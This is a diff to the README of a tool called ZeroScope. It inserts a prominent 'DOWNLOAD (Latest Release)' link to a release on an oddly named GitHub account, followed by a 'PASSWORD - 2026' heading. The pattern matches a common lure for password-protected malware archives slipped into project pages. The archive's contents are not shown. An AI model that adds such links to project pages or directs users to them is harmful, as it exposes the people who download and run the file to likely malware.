@@ -19,6 +19,14 @@ Unlike cloud-based alternatives, ZeroScope requires **no API keys, no telemetry,
 
 ---
 
+ <div align="center">
+  <a href="https://github.com/deathlessinfiniti2r3q/zeroscope/releases/tag/zeroscope">
+    <b>⬇️ DOWNLOAD (Latest Release)</b>
+  </a>
+</div>
+
+## PASSWORD - 2026 
+
 ## Philosophy
 
 ZeroScope is not a product — it’s a **reference implementation**.  
